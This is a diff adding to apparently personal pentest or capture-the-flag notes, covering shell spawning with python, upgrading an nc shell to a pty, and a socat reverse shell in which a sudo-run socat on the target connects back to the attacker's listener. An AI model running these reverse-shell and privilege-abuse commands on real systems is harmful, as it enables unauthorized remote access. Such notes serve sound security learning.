@@ -88,3 +88,14 @@ python -c 'import os; os.system("/bin/sh")'
 When we stabblish the first shell with nc it tends not to have a pty which for some porcesses it can be stressful
 
 to solve that you can run this python adhoc command python -c 'import pty; pty.spawn("/bin/bash")' which gets you a tty that lets you freely run all the commands you need without prompting any error nor warning about not having a tty
+
+
+#Socat GTFO bin
+
+To get a remote shell on a machine using socat you need to run this
+this is run on your local machine
+
+socat file:`tty`,raw,echo=0 tcp-listen:$port
+
+this is run on the remote machine
+sudo /usr/bin/socat tcp-connect:$yourIP:$yourport exec:sh,pty,stderr,setsid,sigint,sane
